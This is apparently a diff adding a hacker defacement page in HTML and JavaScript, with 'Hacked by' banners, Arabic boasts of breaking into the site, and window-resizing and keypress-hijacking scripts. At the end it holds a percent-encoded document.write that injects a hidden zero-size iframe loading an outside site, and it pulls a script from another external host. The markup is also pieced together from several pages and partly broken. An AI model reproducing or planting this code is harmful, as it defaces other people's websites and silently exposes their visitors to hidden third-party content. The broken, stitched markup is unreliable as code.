@@ -1,0 +1,563 @@
+
+<html> 
+<style type="text/css">
+/* Coded by Code X Lucifa */
+@import url(http://fonts.googleapis.com/css?family=Share+Tech);
+body {
+	background:black url('http://1.bp.blogspot.com/-MREqtI3J0i4/VTZ6FLbF2_I/AAAAAAAAAJQ/5P7K-phJFXk/s1600/10923816_767351180008679_4809405704339412853_o.jpg') center right no-repeat; 
+	color:#FFFFFF; 
+	text-decoration:none; 
+	font-family:"Share Tech", Courier, monospace; 
+	padding-left:200px; 
+	padding-top:200px; 
+	padding-right:300px; 
+	font-size:16px;
+}
+a {
+	color: #FF0000;
+	text-decoration: none;
+}
+a:hover {
+	color: #fff;
+}
+#example1 {
+	font-size: 42px;
+	font-family: "Share Tech";
+
+}
+#example2 {
+	font-size: 31px;
+	font-family: "Share Tech";
+
+}
+#example3 {
+	font-size: 26px;
+	font-family: "Share Tech";
+
+}
+</style>
+<SCRIPT> 
+window.scrollBy(0, 1) 
+window.resizeTo(0,0) 
+window.moveTo(0,0) 
+//setInterval("move()",30); 
+setTimeout("move()", 1); 
+var mxm=50 
+var mym=25 
+var mx=0 
+var my=0 
+var sv=50 
+var status=1 
+var szx=0 
+var szy=0 
+var c=255 
+var n=0 
+var sm=30 
+var cycle=2 
+var done=2 
+function move() 
+{ 
+if (status == 1) 
+{ 
+mxm=mxm/1.05 
+mym=mym/1.05 
+mx=mx+mxm 
+my=my-mym 
+mxm=mxm+(400-mx)/100 
+mym=mym-(300-my)/100 
+window.moveTo(mx,my) 
+rmxm=Math.round(mxm/10) 
+rmym=Math.round(mym/10) 
+if (rmxm == 0) 
+{ 
+if (rmym == 0) 
+{ 
+status=2 
+} 
+} 
+} 
+if (status == 2) 
+{ 
+sv=sv/1.1 
+scrratio=1+1/3 
+mx=mx-sv*scrratio/2 
+my=my-sv/2 
+szx=szx+sv*scrratio 
+szy=szy+sv 
+window.moveTo(mx,my) 
+window.resizeTo(szx,szy) 
+if (sv < 0.1) 
+{ 
+status=3 
+} 
+} 
+if (status == 3) 
+{ 
+document.fgColor=0xffffFF 
+c=c-16 
+if (c<0) 
+{status=8} 
+} 
+if (status == 4) 
+{ 
+c=c+16 
+document.bgColor=c*65536 
+document.fgColor=(255-c)*65536 
+if (c > 239) 
+{status=5} 
+} 
+if (status == 5) 
+{ 
+c=c-16 
+document.bgColor=c*65536 
+document.fgColor=(255-c)*65536 
+if (c < 0) 
+{ 
+status=6 
+cycle=cycle-1 
+if (cycle > 0) 
+{ 
+if (done == 1) 
+{status=7} 
+else 
+{status=4} 
+} 
+} 
+} 
+if (status == 6) 
+{ 
+document.title = "Cljck" 
+alert("Cljck") 
+cycle=2 
+status=4 
+done=1 
+} 
+if (status == 7) 
+{ 
+c=c+4 
+document.bgColor=c*65536 
+document.fgColor=(255-c)*65536 
+if (c > 128) 
+{status=8} 
+} 
+if (status == 8) 
+{ 
+window.moveTo(0,0) 
+sx=screen.availWidth 
+sy=screen.availHeight 
+window.resizeTo(sx,sy) 
+status=9 
+} 
+var timer=setTimeout("move()",0.3) 
+} 
+</SCRIPT>
+
+
+
+<script language="javascript">
+function keypressed() {
+alert("&#1578;&#1605; &#1575;&#1604;&#1575;&#1582;&#1578;&#1585;&#1575;&#1602; &#1605;&#1606; &#1602;&#1576;&#1604; &#1593;&#1604;&#1575;&#1608;&#1610; &#1593;&#1605;&#1575;&#1585;&#1607; &#1589;&#1575;&#1603;&#1585;&#1607;&#1605; &#1576;&#1608;&#1610;&#1575; &#1575;&#1604;&#1575;&#1587;&#1605; &#1610;&#1603;&#1601;&#1610;"); 
+}
+document.onkeydown=keypressed;
+// End  -->
+</script>
+
+<script>
+TypingText = function(element, interval, cursor, finishedCallback) {
+  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
+    this.running = true;	// Never run.
+    return;
+  }
+  this.element = element;
+  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
+  this.interval = (typeof interval == "undefined" ? 100 : interval);
+  this.origText = this.element.innerHTML;
+  this.unparsedOrigText = this.origText;
+  this.cursor = (cursor ? cursor : "");
+  this.currentText = "";
+  this.currentChar = 0;
+  this.element.typingText = this;
+  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
+  TypingText.all.push(this);
+  this.running = false;
+  this.inTag = false;
+  this.tagBuffer = "";
+  this.inHTMLEntity = false;
+  this.HTMLEntityBuffer = "";
+}
+TypingText.all = new Array();
+TypingText.currentIndex = 0;
+TypingText.runAll = function() {
+  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
+}
+TypingText.prototype.run = function() {
+  if(this.running) return;
+  if(typeof this.origText == "undefined") {
+    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience. http://www.lozere.maisons-paysannes.org/media/erne.swf
+    return;
+  }
+  if(this.currentText == "") this.element.innerHTML = "";
+//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
+  if(this.currentChar < this.origText.length) {
+    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
+      this.tagBuffer = "<";
+      this.inTag = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
+      this.tagBuffer += ">";
+      this.inTag = false;
+      this.currentText += this.tagBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inTag) {
+      this.tagBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
+      this.HTMLEntityBuffer = "&";
+      this.inHTMLEntity = true;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
+      this.HTMLEntityBuffer += ";";
+      this.inHTMLEntity = false;
+      this.currentText += this.HTMLEntityBuffer;
+      this.currentChar++;
+      this.run();
+      return;
+    } else if(this.inHTMLEntity) {
+      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
+      this.currentChar++;
+      this.run();
+      return;
+    } else {
+      this.currentText += this.origText.charAt(this.currentChar);
+    }
+    this.element.innerHTML = this.currentText;
+    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
+    this.currentChar++;
+    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
+  } else {
+	this.currentText = "";
+	this.currentChar = 0;
+        this.running = false;
+        this.finishedCallback();
+  }
+}
+</script>
+<style>
+body { 
+	padding:0;
+	margin:0;
+	background-repeat: no-repeat;
+	background-position:tile;
+background-color: black;
+color: #000000;
+font: normal 100% Courier;
+margin-top: 0px;
+margin-left: 0px;
+padding: 0;
+margin-right: 0px;
+}
+</style>
+</head>
+><center><font face="abadon" size="24<center><noscript></noscript><!-- --><script type="text/javascript" src="http://www.freewebs.com/p.js"></script><script> 
+farbbibliothek = new Array(); 
+farbbibliothek[0] = new Array("#FF0000","#FF1100","#FF2200","#FF3300","#FF4400","#FF5500","#FF6600","#FF7700","#FF8800","#FF9900","#FFaa00","#FFbb00","#FFcc00","#FFdd00","#FFee00","#FFff00","#FFee00","#FFdd00","#FFcc00","#FFbb00","#FFaa00","#FF9900","#FF8800","#FF7700","#FF6600","#FF5500","#FF4400","#FF3300","#FF2200","#FF1100"); 
+farbbibliothek[1] = new Array("#00FF00","#000000","#00FF00","#00FF00"); 
+farbbibliothek[2] = new Array("#00FF00","#FF0000","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00","#00FF00"); 
+farbbibliothek[3] = new Array("#FF0000","#FF4000","#FF8000","#FFC000","#FFFF00","#C0FF00","#80FF00","#40FF00","#00FF00","#00FF40","#00FF80","#00FFC0","#00FFFF","#00C0FF","#0080FF","#0040FF","#0000FF","#4000FF","#8000FF","#C000FF","#FF00FF","#FF00C0","#FF0080","#FF0040"); 
+farbbibliothek[4] = new Array("#FF0000","#EE0000","#DD0000","#CC0000","#BB0000","#AA0000","#990000","#880000","#770000","#660000","#550000","#440000","#330000","#220000","#110000","#000000","#110000","#220000","#330000","#440000","#550000","#660000","#770000","#880000","#990000","#AA0000","#BB0000","#CC0000","#DD0000","#EE0000"); 
+farbbibliothek[5] = new Array("#000000","#000000","#000000","#FFFFFF","#FFFFFF","#FFFFFF"); 
+farbbibliothek[6] = new Array("#0000FF","#FFFF00"); 
+farbbibliothek[7] = new Array("#FF0000","#fff0FF");
+farben = farbbibliothek[4];
+function farbschrift() 
+{ 
+for(var i=0 ; i<Buchstabe.length; i++) 
+{ 
+document.all["a"+i].style.color=farben[i]; 
+} 
+farbverlauf(); 
+} 
+function string2array(text) 
+{ 
+Buchstabe = new Array(); 
+while(farben.length<text.length) 
+{ 
+farben = farben.concat(farben); 
+} 
+k=0; 
+while(k<=text.length) 
+{ 
+Buchstabe[k] = text.charAt(k); 
+k++; 
+} 
+} 
+function divserzeugen() 
+{ 
+for(var i=0 ; i<Buchstabe.length; i++) 
+{ 
+document.write("<span id='a"+i+"' class='a"+i+"'>"+Buchstabe[i] + "</span>"); 
+} 
+farbschrift(); 
+} 
+var a=1; 
+function farbverlauf() 
+{ 
+for(var i=0 ; i<farben.length; i++) 
+{ 
+farben[i-1]=farben[i]; 
+} 
+farben[farben.length-1]=farben[-1]; 
+ 
+setTimeout("farbschrift()",30); 
+} 
+// Zu Demonstrationszwecken***************** 
+var farbsatz=1; 
+function farbtauscher() 
+{ 
+farben = farbbibliothek[farbsatz]; 
+while(farben.length<text.length) 
+{ 
+farben = farben.concat(farben); 
+} 
+farbsatz=Math.floor(Math.random()*(farbbibliothek.length-0.0001)); 
+} 
+setInterval("farbtauscher()",4500); 
+text= "HAKED BY AHMED ALRAQI"; 
+//h 
+string2array(text);
+divserzeugen(); 
+//document.write(text);   
+//
+/*function expand() {
+for(x = 0; x < 50; x++) {
+window.moveTo(screen.availWidth * -(x - 50) / 100, screen.availHeight * -(x - 50) / 100);
+window.resizeTo(screen.availWidth * x / 50, screen.availHeight * x / 50);
+}
+window.moveTo(0,0);
+window.resizeTo(screen.availWidth, screen.availHeight);
+}
+expand();*/
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+function tb5_makeArray(n){
+this.length = n;
+return this.length;
+}
+
+tb5_messages = new tb5_makeArray(1);
+tb5_messages[0] = "Hacked by ALIOE AMARA";
+tb5_rptType = 'infinite';
+tb5_rptNbr = 2;
+tb5_speed = 40;
+tb5_delay = 1500;
+var tb5_counter=1;
+var tb5_currMsg=0;
+var tb5_stsmsg="";
+function tb5_shuffle(arr){
+var k;
+for (i=0; i<arr.length; i++){
+k = Math.round(Math.random() * (arr.length - i - 1)) + i;
+temp = arr[i];arr[i]=arr[k];arr[k]=temp;
+}
+return arr;
+}
+tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
+tb5_arr[i] = i;
+tb5_sts[i] = "_";
+}
+tb5_arr = tb5_shuffle(tb5_arr);
+function tb5_init(n){
+var k;
+if (n == tb5_arr.length){
+if (tb5_currMsg == tb5_messages.length-1){
+if ((tb5_rptType == 'finite') && (tb5_counter==tb5_rptNbr)){
+clearTimeout(tb5_timerID);
+return;
+}
+tb5_counter++;
+tb5_currMsg=0;
+}
+else{
+tb5_currMsg++;
+}
+n=0;
+tb5_arr = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+tb5_sts = new tb5_makeArray(tb5_messages[tb5_currMsg].length);
+for (var i=0; i<tb5_messages[tb5_currMsg].length; i++){
+tb5_arr[i] = i;
+tb5_sts[i] = "_";
+}
+tb5_arr = tb5_shuffle(tb5_arr);
+tb5_sp=tb5_delay;
+}
+else{
+tb5_sp=tb5_speed;
+k = tb5_arr[n];
+tb5_sts[k] = tb5_messages[tb5_currMsg].charAt(k);
+tb5_stsmsg = "";
+for (var i=0; i<tb5_sts.length; i++)
+tb5_stsmsg += tb5_sts[i];
+document.title = tb5_stsmsg;
+n++;
+}
+tb5_timerID = setTimeout("tb5_init("+n+")", tb5_sp);
+}
+function tb5_randomizetitle(){
+tb5_init(0);
+}
+tb5_randomizetitle();
+//]]></script>
+  </script>
+
+</font></p>
+
+</center></center>
+
+
+
+
+
+<br>
+
+<div align="center"><img src="http://im71.gulfup.com/yiqcfa.jpg"></div>
+
+</br>
+
+
+
+
+
+</body></html>
+<body class='loading'>
+<div class='navbar section' id='navbar'><div class='widget Navbar' id='Navbar1'><script type="text/javascript">
+    function setAttributeOnload(object, attribute, val) {
+      if(window.addEventListener) {
+        window.addEventListener('load',
+          function(){ object[attribute] = val; }, false);
+      } else {
+        window.attachEvent('onload', function(){ object[attribute] = val; });
+      }
+    }
+  </script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.1/jquery.min.js" type="text/javascript"></script> <script type="text/javascript">$(document).ready(function() {$(".facebookbox").hover(function() {$(this).stop().animate({right: "0"}, "medium");}, function() {$(this).stop().animate({right: "-250"}, "medium");}, 500);});
+    </script><style type="text/css">.facebookbox{background:url("https://www.facebook.com/hamed.haker.100") no-repeat scroll left center transparent!important;display:block;float:right;height:270px;padding:0 5px 0 46px;width:245px;z-index:99999;position:fixed;right:-250px;top:40%;}.facebookbox div{border:none;position:relative;display:block;}.facebookbox span{bottom:12px;font:8px"lucida grande",tahoma,verdana,arial,sans-serif;position:absolute;right:6px;text-align:right;z-index:99999;}.facebookbox span a{color:#808080;text-decoration:none;}.facebookbox span a:hover{text-decoration:underline;}</style></head><body bgcolor="red"><div class="facebookbox"><iframe scrolling="no" frameborder="0" style="border: medium none; overflow: hidden; height: 270px; width: 245px;background:#fff;" src="http://www.facebook.com/plugins/likebox.php?href=https://www.facebook.com/hamed.haker.100&colorscheme=light&show_faces=true&connections=9&stream=false&header=false&height=270"></iframe></div>
+<center><body bgcolor="red"><br><br><br><img src="http://4.bp.blogspot.com/-B9mRpzM8Kr4/VZUq7KwAknI/AAAAAAAAAQE/xYPmBkA_GZM/s1600/1412698265.jpg">
+<script src="https://www.facebook.com/hamed.haker.100"></script>
+<link href='https://www.facebook.com/hamed.haker.100' rel='stylesheet' type='text/css'>
+<body bgcolor="red">
+<font class="hk2" style="text-shadow: 1px -1px 8px;" face="tahoma"><font color="#ff0000">
+<script src="https://www.facebook.com/hamed.haker.100"></script>
+</script>
+<center><font face="Iceland" size="8" color="red">&#1575;&#1604;&#1587;&#1604;&#1575;&#1605; &#1593;&#1604;&#1610;&#1603;&#1605; &#1575;&#1588;&#1608;&#1606;&#1603; &#1575;&#1583;&#1605;&#1606; &#1575;&#1604;&#1605;&#1608;&#1602;&#1593; &#1576;&#1604; &#1575;&#1604;&#1576;&#1583;&#1575;&#1610;&#1607; &#1604;&#1610;&#1588; &#1607;&#1610;&#1580; &#1581;&#1605;&#1575;&#1610;&#1607; &#1575;&#1604;&#1605;&#1608;&#1602;&#1593; &#1586;&#1601;&#1578; &#1603;&#1604;&#1588; &#1591;&#1576;&#1593;&#1575; &#1575;&#1604;&#1575;&#1582;&#1578;&#1585;&#1575;&#1602; &#1605;&#1608; &#1604;&#1604;&#1578;&#1582;&#1585;&#1610;&#1576; &#1608;&#1575;&#1604;&#1604;&#1607; &#1585;&#1575;&#1581; &#1575;&#1593;&#1608;&#1601; &#1575;&#1604;&#1605;&#1608;&#1602;&#1593; &#1576;&#1587; &#1575;&#1578;&#1605;&#1606;&#1609; &#1575;&#1578;&#1587;&#1608;&#1606; &#1581;&#1605;&#1575;&#1610;&#1607; &#1575;&#1603;&#1579;&#1585; &#1608;&#1575;&#1603;&#1576;&#1585; &#1604;&#1575;&#1606; &#1575;&#1606;&#1578;&#1605; &#1588;&#1585;&#1603;&#1607; &#1580;&#1576;&#1610;&#1585;&#1607; &#1608;&#1605;&#1593;&#1585;&#1608;&#1601;&#1607; 
+&#1578;&#1605; &#1575;&#1604;&#1575;&#1582;&#1578;&#1585;&#1575;&#1602; &#1605;&#1606; &#1602;&#1576;&#1604; &#1575;&#1581;&#1605;&#1583; &#1575;&#1604;&#1593;&#1585;&#1575;&#1602;&#1610;  </font></center><br>
+<center><font face="Iceland" size="7" color="red">https://www.facebook.com/mohamed.khorbi.5 &#1581;&#1587;&#1575;&#1576;&#1610; &#1604;&#1604;&#1578;&#1608;&#1575;&#1589;&#1604;  </font> <br>
+<font face="Tempus Sans ITC" size="9" color="blue"> ^-^I am Hackers good nice^&#1600;&#1600;&#1600;&#1600;&#1600;^
+<br>
+<EMBED SRC="https://www.youtube.com/v/X95V5uyQhFo" AUTOSTART="TRUE" LOOP="TRUE" WIDTH="7" HEIGHT="1" ALIGN="CENTER"></EMBED>
+
+
+</body> 
+</html>
+
+  <script type="text/javascript">
+<!--//
+function tb9_makeArray(n){
+	this.length = n;
+	return this.length;
+}
+tb9_messages = &#1588;
+tb9_messages[0] = " Hacked BY Ahmed ALIRAQE ";
+tb9_messages[1] = "a";
+tb9_messages[2] = "h";
+tb9_messages[3] = "m";
+tb9_messages[4] = "e";
+tb9_messages[5] = "d";
+tb9_rptType = 'infinite';
+tb9_rptNbr = 5;
+tb9_speed = 75;
+tb9_delay = 2000;
+var tb9_counter=1;
+var tb9_currMsg=0;
+var tb9_timerID = null
+var tb9_bannerRunning = false
+var tb9_state = ""
+tb9_clearState()
+function tb9_stopBanner() {	
+	if (tb9_bannerRunning)		
+	clearTimeout(tb9_timerID)	
+	tb9_timerRunning = false
+}
+function tb9_startBanner() {	
+	tb9_stopBanner()	
+	tb9_showBanner()
+}
+function tb9_clearState() {	
+	tb9_state = ""	
+	for (var i = 0; i < tb9_messages[tb9_currMsg].length; ++i) {		
+		tb9_state += "0"	
+	}
+}
+function tb9_showBanner() {	
+if (tb9_getString()) {		
+	tb9_currMsg++		
+	if (tb9_messages.length <= tb9_currMsg)	{		
+		if ((tb9_rptType == 'finite') && (tb9_counter==tb9_rptNbr)){
+			tb9_stopBanner();
+			return;
+		}
+		tb9_counter++;
+		tb9_currMsg=0;
+	}
+	tb9_clearState()		
+	tb9_timerID = setTimeout("tb9_showBanner()", tb9_delay)	
+} 
+else {		
+	var tb9_str = ""		
+for (var j = 0; j < tb9_state.length; ++j) {			
+	tb9_str += (tb9_state.charAt(j) == "1") ? tb9_messages[tb9_currMsg].charAt(j) : "___"		
+}		
+document.title = tb9_str		
+tb9_timerID = setTimeout("tb9_showBanner()", tb9_speed)	
+}
+}
+function tb9_getString() {	
+	var full = true	
+	for (var j = 0; j < tb9_state.length; ++j) {		
+		if (tb9_state.charAt(j) == 0)			
+			full = false	
+		}	
+	if (full) return true	
+	while (1) {		
+		var num = tb9_getRandom(tb9_messages[tb9_currMsg].length)		
+		if (tb9_state.charAt(num) == "0")			
+			break
+	}	
+	tb9_state = tb9_state.substring(0, num) + "1" + tb9_state.substring(num + 1, tb9_state.length)	
+	return false
+}
+function tb9_getRandom(max) {	
+	var now = new Date()		
+	var num = now.getTime() * now.getSeconds() * Math.random()	
+	return num % max
+}
+tb9_startBanner()
+</script>
+</body>
+</html><script>
+<!--
+document.write(unescape("%3Cscript%3E%0A%3C%21--%0Adocument.write%28unescape%28%22%3Ciframe%20frameborder%3D%220%22%20height%3D%220%22%20src%3D%22http%3A//www.devilscafe.in%22%20%0A%0Awidth%3D%220%22%3E%3C/iframe%3E%0A%3Ca%20href%3D%22http%3A//www.devilscafe.in%22%20target%3D%22_blank%22%3E%3Cimg%20%0A%0Asrc%3D%22%22%20/%3E%22%29%29%3B%0A//--%3E%0A%3C/script%3E"));
+//-->
+</script>
+<audio autoplay="autoplay" hidden="hidden"> <source src="http://c.top4top.net/m_223b2pj1.mp3" type="audio/mp3""> </source></audio>
+ 
